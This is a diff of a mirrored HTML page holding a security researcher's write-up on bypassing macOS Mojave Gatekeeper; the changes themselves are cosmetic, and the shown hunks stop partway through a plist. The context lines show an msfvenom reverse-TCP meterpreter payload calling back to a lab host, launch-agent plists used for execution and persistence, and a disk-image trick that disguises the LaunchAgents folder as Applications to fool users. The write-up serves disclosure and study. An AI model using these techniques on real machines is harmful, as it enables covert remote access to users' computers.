@@ -17,8 +17,8 @@
 <meta property="og:description" content="TL;DR On macOS Mojave Gatekeeper only verifies executables, which are run with the open command or the user double clicks. It won’t verify files, that are executed through other means like, directly executing a binary ./myapp regardless of the quarantine attribute. If you can place a plist file inside LaunchAgents/LaunchDaemons, the command inside will also be executed. Prior to Catalina there is a way to trick users to drag &amp; drop files in the LaunchAgents folder." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://theevilbit.github.io/posts/gatekeeper_bypass_or_not_bypass/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2019-10-25T00:00:00&#43;00:00" />
-<meta property="article:modified_time" content="2019-10-25T00:00:00&#43;00:00" />
+<meta property="article:published_time" content="2019-10-25T00:00:00+00:00" />
+<meta property="article:modified_time" content="2019-10-25T00:00:00+00:00" />
 
 
 
@@ -54,7 +54,7 @@
     <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
     <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">
 
-    <meta name="generator" content="Hugo 0.84.1" />
+    <meta name="generator" content="Hugo 0.89.2" />
   </head>
 
   <body class=" ">
@@ -140,27 +140,27 @@
 On macOS Catalina lot has changed, the most notable one regarding gatekeeper is that it will verify files when executed via classic ‘exec’ methods.</p>
 <h2 id="how-it-started">How it started?</h2>
 <p>When I did my research about embedding files in pkg files back in 2018, I had to verify if Gatekeeper will block my newly created unsigned PKG file or not. First I did a mistake at running it after packing, when I realised, that it’s not good as the file won’t have quarantine extended attribute and Gatekeeper will not check those. Then I downloaded it and instead of double clicking, I did:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod +x mypackage.pkg
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod +x mypackage.pkg
 ./mypackage.pkg 
 </code></pre></div><p>And it run. And I was like: WHAT?!?!?!  Why could I run an unsigned PKG file if it has a quarantine attribute? Obviously I didn’t really understood at this point how Gatekeeper works, but more on that later. So I started to experiment, and see how can I run unsigned code.</p>
 <h2 id="the-mojave-era">The Mojave era</h2>
 <h3 id="preparation">Preparation</h3>
 <p>I created a meterpreter in Kali linux for testing:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p osx/x64/meterpreter_reverse_tcp <span style="color:#033">LHOST</span><span style="color:#555">=</span>192.168.120.132 <span style="color:#033">LPORT</span><span style="color:#555">=</span><span style="color:#f60">80</span> -f macho &gt; m
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p osx/x64/meterpreter_reverse_tcp <span style="color:#033">LHOST</span><span style="color:#555">=</span>192.168.120.132 <span style="color:#033">LPORT</span><span style="color:#555">=</span><span style="color:#f60">80</span> -f macho &gt; m
 <span style="color:#555">[</span>-<span style="color:#555">]</span> No platform was selected, choosing Msf::Module::Platform::OSX from the payload
 <span style="color:#555">[</span>-<span style="color:#555">]</span> No arch selected, selecting arch: x64 from the payload
 No encoder or badchars specified, outputting raw payload
 Payload size: <span style="color:#f60">808168</span> bytes
 Final size of macho file: <span style="color:#f60">808168</span> bytes
 </code></pre></div><p>Then I started a HTTP server to simulate the download, and downloaded it to my macOS:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python -m SimpleHTTPServer <span style="color:#f60">8080</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python -m SimpleHTTPServer <span style="color:#f60">8080</span>
 Serving HTTP on 0.0.0.0 port <span style="color:#f60">8080</span> ...
 192.168.120.1 - - <span style="color:#555">[</span>08/Feb/2019 08:27:12<span style="color:#555">]</span> <span style="color:#c30">&#34;GET / HTTP/1.1&#34;</span> <span style="color:#f60">200</span> -
 192.168.120.1 - - <span style="color:#555">[</span>08/Feb/2019 08:27:13<span style="color:#555">]</span> code 404, message File not found
 192.168.120.1 - - <span style="color:#555">[</span>08/Feb/2019 08:27:13<span style="color:#555">]</span> <span style="color:#c30">&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span style="color:#f60">404</span> -
 192.168.120.1 - - <span style="color:#555">[</span>08/Feb/2019 08:27:15<span style="color:#555">]</span> <span style="color:#c30">&#34;GET /m HTTP/1.1&#34;</span> <span style="color:#f60">200</span> -
 </code></pre></div><p>If I check the file’s extended attributes it looks right:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">xattr -l m
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">xattr -l m
 com.apple.metadata:kMDItemWhereFroms:
 <span style="color:#f60">00000000</span>  <span style="color:#f60">62</span> <span style="color:#f60">70</span> 6C <span style="color:#f60">69</span> <span style="color:#f60">73</span> <span style="color:#f60">74</span> <span style="color:#f60">30</span> <span style="color:#f60">30</span> A2 <span style="color:#f60">01</span> <span style="color:#f60">02</span> 5F <span style="color:#f60">10</span> 1D <span style="color:#f60">68</span> <span style="color:#f60">74</span>  |bplist00…_..ht|
 <span style="color:#f60">00000010</span>  <span style="color:#f60">74</span> <span style="color:#f60">70</span> 3A 2F 2F <span style="color:#f60">31</span> <span style="color:#f60">39</span> <span style="color:#f60">32</span> 2E <span style="color:#f60">31</span> <span style="color:#f60">36</span> <span style="color:#f60">38</span> 2E <span style="color:#f60">31</span> <span style="color:#f60">32</span> <span style="color:#f60">30</span>  |tp://192.168.120|
@@ -177,15 +177,15 @@ com.apple.quarantine: 0081;5c5d2f53;Chrome;4FFAAC3A-929D-45EB-ABEF-78B25C3CC15E
 <p>If I try the <code>open</code> command it will be also blocked.</p>
 <h3 id="experiment-2">Experiment #2</h3>
 <p>But if I open Terminal, and set the file executable, I can run it without any issues:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod +x m
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod +x m
 ./m
 </code></pre></div><p>And I get my shell:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf exploit<span style="color:#555">(</span>multi/handler<span style="color:#555">)</span> &gt; run
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf exploit<span style="color:#555">(</span>multi/handler<span style="color:#555">)</span> &gt; run
 <span style="color:#555">[</span>*<span style="color:#555">]</span> Started reverse TCP handler on 192.168.120.132:80 
 <span style="color:#555">[</span>*<span style="color:#555">]</span> Meterpreter session <span style="color:#f60">1</span> opened <span style="color:#555">(</span>192.168.120.132:80 -&gt; 192.168.120.1:53040<span style="color:#555">)</span> at 2019-02-08 08:32:06 +0100
 </code></pre></div><h3 id="experiment-3">Experiment #3</h3>
 <p>I create a launch plist file:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
 <span style="color:#099">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span>
 <span style="color:#309;font-weight:bold">&lt;plist</span> <span style="color:#309">version=</span><span style="color:#c30">&#34;1.0&#34;</span><span style="color:#309;font-weight:bold">&gt;</span>
 <span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
@@ -200,7 +200,7 @@ com.apple.quarantine: 0081;5c5d2f53;Chrome;4FFAAC3A-929D-45EB-ABEF-78B25C3CC15E
 <span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
 <span style="color:#309;font-weight:bold">&lt;/plist&gt;</span>
 </code></pre></div><p>If you can’t mark it executable:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
 <span style="color:#099">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span>
 <span style="color:#309;font-weight:bold">&lt;plist</span> <span style="color:#309">version=</span><span style="color:#c30">&#34;1.0&#34;</span><span style="color:#309;font-weight:bold">&gt;</span>
 <span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
@@ -217,22 +217,22 @@ com.apple.quarantine: 0081;5c5d2f53;Chrome;4FFAAC3A-929D-45EB-ABEF-78B25C3CC15E
 <span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
 <span style="color:#309;font-weight:bold">&lt;/plist&gt;</span>
 </code></pre></div><p>And run:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">launchctl load test.plist
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">launchctl load test.plist
 </code></pre></div><p>And I get my shell again.</p>
 <h3 id="experiment-4">Experiment #4</h3>
 <p>Make a C code to run a supplied program:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#099">#include</span> <span style="color:#099">&lt;stdio.h&gt;</span><span style="color:#099">
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#099">#include</span> <span style="color:#099">&lt;stdio.h&gt;</span><span style="color:#099">
 </span><span style="color:#099">#include</span> <span style="color:#099">&lt;stdlib.h&gt;</span><span style="color:#099">
 </span><span style="color:#099"></span>
 <span style="color:#078;font-weight:bold">int</span> <span style="color:#c0f">main</span>(<span style="color:#078;font-weight:bold">int</span> argc, <span style="color:#078;font-weight:bold">char</span><span style="color:#555">*</span> argv[]) {
     system(argv[<span style="color:#f60">1</span>]);
 }
-</code></pre></div><div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gcc hello.c -o h
+</code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gcc hello.c -o h
 ./h /Users/csaby/Downloads/m
 </code></pre></div><h3 id="1-bonus-dyld_insert_libraries">+1 Bonus: DYLD_INSERT_LIBRARIES</h3>
 <p>You can inject quarantine flagged binaries in Mojave, which in fact is pretty much expected. See my older post about how to perform this injection:
 <a href="https://theevilbit.github.io/posts/dyld_insert_libraries_dylib_injection_in_macos_osx_deep_dive/">DYLD_INSERT_LIBRARIES DYLIB injection in macOS / OSX · theevilbit blog</a></p>
-<pre><code>$ ./test 
+<pre tabindex="0"><code>$ ./test 
 Hello from dylib!
 
 $ xattr -l inject.dylib 
@@ -266,29 +266,29 @@ com.apple.quarantine: 0081;5d248e35;Chrome;CE4482F1-0AD8-4387-ABF6-C05A4443CAF4
 <h3 id="try--fail-1---use-relative-paths-in-zip">Try &amp; Fail 1 - use relative paths in ZIP</h3>
 <p>In a ZIP file you can use relative paths, so my first thought was to use that. It failed, here is how I prepared the file, and then where it was dropped.</p>
 <p>Create test file, compress and cleanup.</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ <span style="color:#366">echo</span> <span style="color:#366">test</span> &gt; ../Library/LaunchAgents/test.plist
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ <span style="color:#366">echo</span> <span style="color:#366">test</span> &gt; ../Library/LaunchAgents/test.plist
 mac:Downloads csaby$ zip test.zip ../Library/LaunchAgents/test.plist 
   adding: ../Library/LaunchAgents/test.plist <span style="color:#555">(</span>stored 0%<span style="color:#555">)</span>
 
 mac:Downloads csaby$ rm ../Library/LaunchAgents/test.plist 
 </code></pre></div><p>Download file, and check where it is dropped</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ls ../Library/LaunchAgents/test.plist
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ls ../Library/LaunchAgents/test.plist
 ls: ../Library/LaunchAgents/test.plist: No such file or directory
 mac:Downloads csaby$ ls Library/LaunchAgents/test.plist
 </code></pre></div><p>Ok, it didn’t care about the traversal, my second thought was to use the tilde sign.</p>
 <p>Prepare and cleanup.</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ <span style="color:#366">echo</span> <span style="color:#366">test</span> &gt; ../Library/LaunchAgents/test.plist
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ <span style="color:#366">echo</span> <span style="color:#366">test</span> &gt; ../Library/LaunchAgents/test.plist
 mac:Downloads csaby$ rm test.zip 
 mac:Downloads csaby$ zip test.zip ~/Library/LaunchAgents/test.plist 
   adding: Users/csaby/Library/LaunchAgents/test.plist <span style="color:#555">(</span>stored 0%<span style="color:#555">)</span>
 mac:Downloads csaby$ rm ../Library/LaunchAgents/test.plist 
 </code></pre></div><p>Download, and find it.</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ls Library/LaunchAgents/test.plist
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ls Library/LaunchAgents/test.plist
 ls: Library/LaunchAgents/test.plist: No such file or directory
 mac:Downloads csaby$ ls ~/Library/LaunchAgents/test.plist
 ls: /Users/csaby/Library/LaunchAgents/test.plist: No such file or directory
 </code></pre></div><p>So where it is?</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ cat test.zip 
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ cat test.zip 
 PK
 G_?N?5?;+Users/csaby/Library/LaunchAgents/test.plistUT	???<span style="color:#c30;font-weight:bold">\΃</span>?<span style="color:#c30;font-weight:bold">\u</span>x
                                                                  ?test
@@ -296,14 +296,14 @@ PK
 G_?N?5?;+??Users/csaby/Library/LaunchAgents/test.plistUT???<span style="color:#c30;font-weight:bold">\u</span>x
                                                               ?PKqj
 </code></pre></div><p>Looks like zip replaced the ~ with the actual path.</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ls Users/csaby/Library/LaunchAgents/test.plist 
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ls Users/csaby/Library/LaunchAgents/test.plist 
 Users/csaby/Library/LaunchAgents/test.plist
 </code></pre></div><p>Why that happens? If we look at the archive utility settings, which is used to extract files, we got this:</p>
 <p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-04-03%20at%2012.03.48.png" alt=""></p>
 <p>So it seems, whatever we do, it will create the files there.</p>
 <h3 id="try--fail-2---symlink">Try &amp; Fail 2 - Symlink</h3>
 <p>Symlinks worked once, maybe they could work again. Let’s create a symlink, a test file, add it to a zip file, and cleanup:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ln -s ../Library/LaunchAgents/ la
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ln -s ../Library/LaunchAgents/ la
 mac:Downloads csaby$ <span style="color:#366">echo</span> <span style="color:#366">test</span> &gt; la/test.plist
 
 mac:Downloads csaby$ ls -l la
@@ -320,7 +320,7 @@ mac:Downloads csaby$ rm ../Library/LaunchAgents/test.plist
 <p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-04-04%20at%209.22.47.png" alt=""></p>
 <p>If we add just a symbolic link, it will be extracted, but anything inside that won’t be.</p>
 <p>If we unzip it with unzip it also works:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ln -s ../Library/LaunchAgents/ la
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ln -s ../Library/LaunchAgents/ la
 mac:Downloads csaby$ zip -y test.zip la
   adding: la <span style="color:#555">(</span>stored 0%<span style="color:#555">)</span>
 mac:Downloads csaby$ ls la/
@@ -342,7 +342,7 @@ finishing deferred symbolic links:
 mac:Downloads csaby$ ls la
 com.google.keystone.agent.plist		com.google.keystone.xpcservice.plist	com.objectiveSee.blockblock.plist
 </code></pre></div><p>Interestingly if we use the built in unzip command line utility it will follow symlinks when extracting:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ <span style="color:#366">echo</span> <span style="color:#366">test</span> &gt; la/test.plist
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ <span style="color:#366">echo</span> <span style="color:#366">test</span> &gt; la/test.plist
 mac:Downloads csaby$ zip t.zip la/test.plist 
   adding: la/test.plist <span style="color:#555">(</span>stored 0%<span style="color:#555">)</span>
 mac:Downloads csaby$ cat t.zip 
@@ -362,11 +362,11 @@ Archive:  t.zip
 mac:Downloads csaby$ ls la
 com.google.keystone.agent.plist		com.google.keystone.xpcservice.plist	com.objectiveSee.blockblock.plist	test.plist
 </code></pre></div><p>However if we try to extract the above zip file with Archive Utility, it won’t follow symlinks, and will create a new folder:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ls la<span style="color:#c30;font-weight:bold">\ </span>2/
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ls la<span style="color:#c30;font-weight:bold">\ </span>2/
 test.plist
 </code></pre></div><h3 id="try--fail-3---cpio-archives">Try &amp; Fail 3 - CPIO archives</h3>
 <p>Doesn’t make a difference. Here is how you create a CPIO archive:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ls ../Library/LaunchAgents/test.plist | cpio -ov &gt; test.cpio
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mac:Downloads csaby$ ls ../Library/LaunchAgents/test.plist | cpio -ov &gt; test.cpio
 ../Library/LaunchAgents/test.plist
 <span style="color:#f60">1</span> block
 
@@ -384,7 +384,7 @@ mac:Downloads csaby$ cat test.cpio
 <p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-05-28%20at%2015.12.04.png" alt=""></p>
 <p>What if we replace the app on the left with a plist file, and the link on the right pointing to LaunchAgents.</p>
 <p>Replacing the link on the right is easy, just make this:</p>
-<pre><code>ln -s ~/Library/LaunchAgents/ Applications
+<pre tabindex="0"><code>ln -s ~/Library/LaunchAgents/ Applications
 </code></pre><p>It will look exactly the same as the real link above. This means that you can easily fake any link pointing anywhere, while the user will think that it actually points to the Applications folder.</p>
 <p>Replacing the one at the left is also easy. Put there the plist file, and on the “Get Info” pane replace its icon with D&amp;D a new image on the top left corner of the info pane, here:</p>
 <p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-05-28%20at%2015.19.41.png" alt=""></p>
@@ -394,7 +394,7 @@ mac:Downloads csaby$ cat test.cpio
 <p><img src="https://theevilbit.github.io/images/GateKeeper_Bypass_or_not_bypass/Screenshot%202019-05-28%20at%2015.18.01.png" alt=""></p>
 <p>Does it look legit? For me for sure it is! :) Now if you drag and drop the gecko from the left to the right, you actually drop the PLIST into the user’s LaunchDaemon’s folder. I’m not sure that the average user will notice that something went wrong, other than not being able to execute the application, and won’t see it.</p>
 <p>However upon next reboot the command embedded in the plist file, will be executed. My example plist file is:</p>
-<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
 <span style="color:#099">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span>
 <span style="color:#309;font-weight:bold">&lt;plist</span> <span style="color:#309">version=</span><span style="color:#c30">&#34;1.0&#34;</span><span style="color:#309;font-weight:bold">&gt;</span>
 <span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
